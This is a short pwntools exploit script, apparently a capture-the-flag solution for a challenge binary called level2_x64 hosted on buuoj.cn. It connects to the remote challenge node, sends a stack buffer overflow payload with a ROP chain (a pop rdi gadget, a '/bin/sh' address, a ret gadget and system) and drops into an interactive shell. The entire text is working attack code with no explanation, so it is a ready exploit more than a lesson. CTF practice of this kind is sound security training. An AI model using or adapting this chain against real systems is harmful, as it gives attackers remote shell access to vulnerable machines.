from pwn import *
sh = remote("node5.buuoj.cn",25773)
#sh = process("./level2_x64")
binsh = 0x0600A90
pop_rdi = 0x0004006b3
system = 0x04004C0
ret = 0x004004a1
payload = b"A"* 0x88 + p64(pop_rdi) + p64(binsh) +p64(ret)+ p64(system)
sh.recvuntil(b"Input:")
sh.sendline(payload)
sh.interactive()
